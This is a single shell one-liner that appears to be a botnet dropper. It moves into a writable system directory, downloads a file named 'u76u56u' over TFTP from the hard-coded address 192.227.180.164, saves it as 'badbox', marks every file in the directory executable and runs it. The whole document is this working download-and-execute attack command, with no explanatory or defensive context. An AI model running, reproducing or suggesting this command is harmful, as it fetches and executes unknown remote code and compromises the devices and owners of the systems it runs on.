cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r u76u56u -g 192.227.180.164;cat u76u56u >badbox;chmod +x *;./badbox
